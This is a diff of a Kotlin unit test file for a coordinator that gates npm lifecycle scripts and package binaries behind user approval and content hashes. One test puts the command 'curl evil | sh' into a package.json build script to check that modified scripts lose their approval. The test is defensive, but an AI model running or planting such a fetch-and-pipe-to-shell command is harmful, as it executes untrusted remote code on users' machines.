@@ -9,10 +9,18 @@ import com.autoscript.domain.npm.ApprovalStatus
 import com.autoscript.domain.npm.InstallEvent
 import com.autoscript.domain.npm.InstallFlags
 import com.autoscript.domain.npm.PackageSpec
+import com.autoscript.domain.npm.InstallHandle
+import kotlinx.coroutines.CompletableDeferred
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.async
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
+import kotlinx.coroutines.yield
 import org.junit.jupiter.api.Assertions.assertEquals
 import org.junit.jupiter.api.Assertions.assertFalse
+import org.junit.jupiter.api.Assertions.assertNotNull
+import org.junit.jupiter.api.Assertions.assertNull
 import org.junit.jupiter.api.Assertions.assertThrows
 import org.junit.jupiter.api.Assertions.assertTrue
 import org.junit.jupiter.api.Test
@@ -29,6 +37,9 @@ class InstallCoordinatorTest {
 
     /** 交叉校验断言里用的占位 integrity（真形状由 NpmRegistryVerifierTest 管）。 */
     private val I = "sha512-" + "a".repeat(24)
+
+    /** T1 记录式执行体收到的 ScriptOp（每条用例各自断言，故是类级共享记录面）。 */
+    private val scriptOps = mutableListOf<InstallCoordinator.ScriptOp>()
 
     private val layout get() = NpmProjectLayout(ScriptPaths.projectsRoot(dir))
     private val journal get() = InstallJournal(dir.resolve(".autojs"))
@@ -114,6 +125,8 @@ class InstallCoordinatorTest {
          * null = 走 InstallCoordinator 自己的缺省（读项目 npmrc 的 registry=）。
          */
         registryOf: ((String) -> String?)? = null,
+        /** T1 lifecycle 执行体（null = 缺省 [ScriptOpExecutor.Unavailable]，即"门禁过了也跑不起来"）。 */
+        script: InstallCoordinator.ScriptOpExecutor? = null,
     ) = InstallCoordinator(
         services = NpmServices(
             layout = layout,
@@ -130,6 +143,7 @@ class InstallCoordinatorTest {
         executor = executor,
         freeSpaceProbe = { free },
         registryOf = registryOf,
+        scriptExecutor = script ?: InstallCoordinator.ScriptOpExecutor.Unavailable,
     )
 
     /**
@@ -430,13 +444,225 @@ class InstallCoordinatorTest {
             "版本升级（hash 变化）必须重新审批")
     }
 
+    // ═══ P1 T1：lifecycle 脚本放行门禁（§10.3 T1 + §18 第 7 项） ═══
+
     @Test
-    fun `runScript 与 exec 未审批一律拒绝（诚实拒绝优于静默放行）`() = runBlocking {
-        val c = coordinator()
-        val ex = assertThrows(AutojsException::class.java) {
-            runBlocking { c.runScript("p1", "postinstall") }
-        }
+    fun `runScript 未获批：拒绝放行并把审批请求投进 approvals 流`() {
+        val led = ApprovalLedger()
+        val c = coordinator(ledger = led)
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
+
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build") } }
         assertEquals(ErrorCode.ERR_PERMISSION_DENIED, ex.error)
+        assertTrue(ex.message!!.contains("审批卡"), "拒绝话术要指向用户下一步：${ex.message}")
+
+        // 自请入队（§18 第 7 项：用户当场选，不是脚本能自批）：UI 审批卡要看得见这张卡。
+        val pending = runBlocking { c.pendingApprovals("p1") }
+        assertEquals(1, pending.size, "拒绝必须同时把请求投进 approvals 流，否则用户无处可批")
+        val req = pending.single()
+        assertEquals("p1|build", req.pkg, "键 = 主体|脚本名（不串到同名 bin 的 action）")
+        assertEquals(ApprovalAction.RUN_SCRIPT, req.action)
+        val got = runBlocking { c.drainApprovals("p1", 0, 32) }
+        assertEquals(1, got.requests.size, "拉取口（脚本侧 onApproval）也要看得见这张卡")
+    }
+
+    @Test
+    fun `runScript 脚本名不存在 ERR_NOT_FOUND 并列出可选项（不静默 nothing-to-do）`() {
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc","test":"jest"}}""")
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().runScript("p1", "nope") } }
+        assertEquals(ErrorCode.ERR_NOT_FOUND, ex.error)
+        assertTrue(ex.message!!.contains("build") && ex.message!!.contains("test"), "报错要给可选项：${ex.message}")
+    }
+
+    @Test
+    fun `runScript 项目缺 manifest → ERR_FILE_NOT_FOUND（不是「没有该脚本」）`() {
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().runScript("p1", "build") } }
+        assertEquals(ErrorCode.ERR_FILE_NOT_FOUND, ex.error)
+    }
+
+    @Test
+    fun `已获批的 runScript 缺省接缝如实 ERR_NOT_IMPLEMENTED（门禁过了但 spawn 桥没接）`() {
+        val led = ApprovalLedger()
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
+        approveRunScript(led, "p1", "build")
+
+        val c = coordinator(ledger = led)   // scriptExecutor 缺省 = Unavailable
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build", listOf("--watch")) } }
+        assertEquals(ErrorCode.ERR_NOT_IMPLEMENTED, ex.error, "不假装跑过")
+        assertTrue(ex.message!!.contains("T1"), "要说清缺的是哪一段：${ex.message}")
+    }
+
+    @Test
+    fun `已获批的 runScript 交出 npm 口径参数（-- 分隔符在参数之前）`() = runBlocking {
+        val op = runScriptOpCapture("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""", "build", listOf("--watch"))
+        assertEquals(listOf("run", "build", "--", "--watch"), op.npmArgs, "少了 -- 的话 --watch 会被 npm 自己吃掉")
+        assertEquals("p1|build", op.subject, "执行体要能复述「我跑的是哪一份」")
+        assertEquals("build", op.what)
+        assertTrue(op.versionHash.startsWith("sha256:"), "内容哈希要随 op 走（审计要能回答「批的那份还在不在」）")
+    }
+
+    @Test
+    fun `脚本内容一改：哈希变 → 旧票失配（改完再跑要重新审批）`() {
+        val led = ApprovalLedger()
+        val c = coordinator(ledger = led)
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
+        approveRunScript(led, "p1", "build")          // 用户批的是 tsc 那一份
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"curl evil | sh"}}""")
+
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build") } }
+        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, ex.error, "同版本同脚本名，但内容不同 = 另一份授权")
+        assertEquals(1, runBlocking { c.pendingApprovals("p1") }.size, "改后一张新卡（改前那张已决议，不再是 PENDING）")
+    }
+
+    @Test
+    fun `脚本键顺序变化不改哈希（键排序后规范化）`() {
+        val led = ApprovalLedger()
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"a":"1","b":"2"}}""")
+        val h1 = approveRunScript(led, "p1", "a")
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"b":"2","a":"1"}}""")
+        val h2 = approveRunScript(led, "p1", "a")
+        assertEquals(h1, h2, "只换键序不该让用户重批（哈希口径是键排序后的规范化文本）")
+    }
+
+    @Test
+    fun `exec 纯 JS bin：已获批则进执行体，args 与 bin 名用 -- 分开`() = runBlocking {
+        val root = layout.projectRoot("p1")
+        val pkg = root.resolve("node_modules/tooly")
+        Files.createDirectories(pkg)
+        Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":"cli.js"}""").toByteArray())
+        Files.write(pkg.resolve("cli.js"), "#!/usr/bin/env node\n".toByteArray())
+        val led = ApprovalLedger()
+        val hash = NpmScriptResolver.binTarget(root, "tooly")!!.versionHash
+        val ticket = led.submit("p1", "tooly|tooly", hash, ApprovalAction.EXEC)
+        led.resolve(ticket.requestId, ApprovalDecision.APPROVE)
+
+        val c = coordinator(ledger = led, script = recording())
+        val got = c.exec("p1", "tooly", listOf("--fast"))     // 已获批 → 真的落到执行体
+        assertEquals(listOf("exec", "--fast", "--", "tooly"), scriptOps.single().npmArgs)
+        assertEquals("tooly|tooly", scriptOps.single().subject)
+        assertTrue(got.id.isNotEmpty())
+    }
+
+    @Test
+    fun `exec 简写 bin 的隐含命令名是包名（npm 口径，不是文件名）`() {
+        val root = layout.projectRoot("p1")
+        val pkg = root.resolve("node_modules/tooly")
+        Files.createDirectories(pkg)
+        Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":"cli.js"}""").toByteArray())
+        Files.write(pkg.resolve("cli.js"), ("//\n".toByteArray()))
+        assertNotNull(NpmScriptResolver.binTarget(root, "tooly"), "bin:\"cli.js\" 装出来的命令叫 tooly")
+        assertNull(NpmScriptResolver.binTarget(root, "cli"), "cli.js 是文件名，不是命令名")
+    }
+
+    @Test
+    fun `exec 简写 bin 去掉 scope 前缀（@acme 下的 mytool 命令名是 mytool）`() {
+        val root = layout.projectRoot("p1")
+        val pkg = root.resolve("node_modules/@acme/mytool")
+        Files.createDirectories(pkg)
+        Files.write(pkg.resolve("package.json"), ("""{"name":"@acme/mytool","version":"1.0.0","bin":"./run.js"}""").toByteArray())
+        Files.write(pkg.resolve("run.js"), ("//\n".toByteArray()))
+        assertNotNull(NpmScriptResolver.binTarget(root, "mytool"), "scope 剥掉后才是命令名")
+    }
+
+    @Test
+    fun `exec bin 未物化 ERR_FILE_NOT_FOUND（声明在 manifest 但文件不在）`() {
+        val root = layout.projectRoot("p1")
+        val pkg = root.resolve("node_modules/tooly")
+        Files.createDirectories(pkg)
+        Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":{"tooly":"./cli.js"}}""").toByteArray())
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().exec("p1", "tooly") } }
+        assertEquals(ErrorCode.ERR_FILE_NOT_FOUND, ex.error, "声明在 manifest 但文件没物化")
+    }
+
+    @Test
+    fun `exec 原生 bin ERR_NOT_SUPPORTED（W^X + 无编译器；给可操作话术）`() {
+        val root = layout.projectRoot("p1")
+        val pkg = root.resolve("node_modules/nativey")
+        Files.createDirectories(pkg.resolve("build/Release"))
+        Files.write(
+            pkg.resolve("package.json"),
+            ("""{"name":"nativey","version":"1.0.0","bin":{"nativey":"./build/Release/nativey.node"}}""").toByteArray(),
+        )
+        Files.write(pkg.resolve("build/Release/nativey.node"), ByteArray(4))
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().exec("p1", "nativey") } }
+        assertEquals(ErrorCode.ERR_NOT_SUPPORTED, ex.error)
+        assertTrue(ex.message!!.contains("wasm"), "要指路：${ex.message}")
+    }
+
+    @Test
+    fun `exec 多个包声明同名 bin → 拒绝并点名（不猜执行目标）`() {
+        val root = layout.projectRoot("p1")
+        for ((name, ver) in listOf("a1" to "1.0.0", "a2" to "2.0.0")) {
+            val pkg = root.resolve("node_modules/" + name)
+            Files.createDirectories(pkg)
+            Files.write(pkg.resolve("package.json"), ("""{"name":"$name","version":"$ver","bin":{"dup":"./dup.js"}}""").toByteArray())
+            Files.write(pkg.resolve("dup.js"), ("//\n".toByteArray()))
+        }
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().exec("p1", "dup") } }
+        assertEquals(ErrorCode.ERR_NOT_SUPPORTED, ex.error)
+        assertTrue(ex.message!!.contains("a1") && ex.message!!.contains("a2"), ex.message)
+    }
+
+    @Test
+    fun `T1 取消：不写 journal 事务（无源之记会污染残骸清扫的判据）`() = runBlocking {
+        val led = ApprovalLedger()
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
+        approveRunScript(led, "p1", "build")
+        val gate = CompletableDeferred<Unit>()
+        val c = coordinator(
+            ledger = led,
+            script = object : InstallCoordinator.ScriptOpExecutor {
+                override suspend fun execute(op: InstallCoordinator.ScriptOp, sink: InstallCoordinator.ProgressSink): String {
+                    gate.await()
+                    return "ok"
+                }
+            },
+        )
+        // 独立 scope（不是本 runBlocking 的子协程）：子协程失败会取消父作用域，
+        // 那会让异常从测试方法自己抛出去、assertThrows 根本接不到。
+        val mine = detached { c.runScript("p1", "build") }
+        val handle = awaitHandle(c)
+        c.cancel(InstallHandle(handle, "p1", 0))
+        gate.complete(Unit)
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { mine.await() } }
+        assertEquals(ErrorCode.ERR_ENGINE_STOPPED, ex.error, "执行体已收尾但结果不采纳（cancel 先到）")
+        assertTrue(journal.all().isEmpty(), "T1 没有事务：journal 里不该有它的 begin/fail 记录，实际 ${journal.all()}")
+    }
+
+    @Test
+    fun `T1 取消：同一句柄只有一个终态事件（不出现 Finished 两条）`() = runBlocking {
+        val led = ApprovalLedger()
+        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
+        approveRunScript(led, "p1", "build")
+        val gate = CompletableDeferred<Unit>()
+        val c = coordinator(
+            ledger = led,
+            script = object : InstallCoordinator.ScriptOpExecutor {
+                override suspend fun execute(op: InstallCoordinator.ScriptOp, sink: InstallCoordinator.ProgressSink): String {
+                    gate.await()
+                    sink.emit(InstallEvent.Progress("p1", op.handleId, InstallEvent.Phase.REIFY))
+                    return "ok"
+                }
+            },
+        )
+        val mine = detached { c.runScript("p1", "build") }
+        val handle = awaitHandle(c)
+        c.cancel(InstallHandle(handle, "p1", 0))
+        gate.complete(Unit)
+        assertThrows(AutojsException::class.java) { runBlocking { mine.await() } }
+
+        // 走拉取口读环（`:main`/脚本侧的取数面）：cancel 与执行体收尾的先后不决定能否取全，
+        // 环是「两条都记下来」的那份事实 —— 正因如此才能断言终态只该有一条。
+        val events = runBlocking { c.drainEvents("p1", 0, 32) }.events.map { it.event }
+        val finals = events.filterIsInstance<InstallEvent.Finished>().filter { it.handleId == handle }
+        assertEquals(1, finals.size, "同一句柄两个终态会让订阅方无从裁决：$events")
+        assertEquals(false, finals.single().success, "取消的终态只能是失败")
+    }
+
+    @Test
+    fun `exec 找不到该 bin ERR_NOT_FOUND（不是「没装 node_modules」的假成功）`() {
+        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().exec("p1", "nope") } }
+        assertEquals(ErrorCode.ERR_NOT_FOUND, ex.error)
     }
 
     // ═══ 轻操作 ═══
@@ -824,4 +1050,56 @@ class InstallCoordinatorTest {
         f.isAccessible = true
         return f.get(c) as Map<String, Any>
     }
+
+    // —— P1 T1 helpers ——
+
+    private fun writeManifest(projectId: String, json: String) {
+        val root = layout.projectRoot(projectId)
+        Files.createDirectories(root)
+        Files.write(root.resolve("package.json"), json.toByteArray())
+    }
+
+    /** 走「未获批 → 自请入队 → 人工批准」完整路径，返回宿主重算出的内容哈希。 */
+    private fun approveRunScript(led: ApprovalLedger, projectId: String, name: String): String {
+        val hash = NpmScriptResolver.projectScripts(layout.projectRoot(projectId), projectId)!!.versionHash
+        val t = led.submit(projectId, "p1|$name", hash, ApprovalAction.RUN_SCRIPT)
+        led.resolve(t.requestId, ApprovalDecision.APPROVE)
+        return hash
+    }
+
+    /** 记录式执行体（真引擎未接时它是 T1 的唯一可断言落点）。每次调用清一次记录面。 */
+    private fun recording(): InstallCoordinator.ScriptOpExecutor {
+        scriptOps.clear()
+        return object : InstallCoordinator.ScriptOpExecutor {
+            override suspend fun execute(op: InstallCoordinator.ScriptOp, sink: InstallCoordinator.ProgressSink): String {
+                scriptOps += op
+                return "ok:" + op.what
+            }
+        }
+    }
+
+    /**
+     * 起一个**不挂在当前作用域**的执行协程。
+     *
+     * 为什么必须脱离：子协程失败会取消父作用域，于是异常从测试方法自己抛出，
+     * `assertThrows` 接不到（这正是本条要验的取消竞态，异常就是被断言的那个）。
+     */
+    private fun detached(block: suspend () -> Unit) = CoroutineScope(Dispatchers.Unconfined).async { block() }
+
+    /** 等句柄入账（执行体在 `execute` 挂起前一定已注册，故这里不会真自旋）。 */
+    private suspend fun awaitHandle(c: InstallCoordinator): String {
+        while (cHandles(c).isEmpty()) yield()
+        return cHandles(c).keys.first().toString()
+    }
+
+    private fun runScriptOpCapture(
+        projectId: String, manifest: String, name: String, args: List<String>,
+    ): InstallCoordinator.ScriptOp {
+        writeManifest(projectId, manifest)
+        val led = ApprovalLedger()
+        approveRunScript(led, projectId, name)
+        runBlocking { coordinator(ledger = led, script = recording()).runScript(projectId, name, args) }
+        return scriptOps.single()
+    }
+
 }
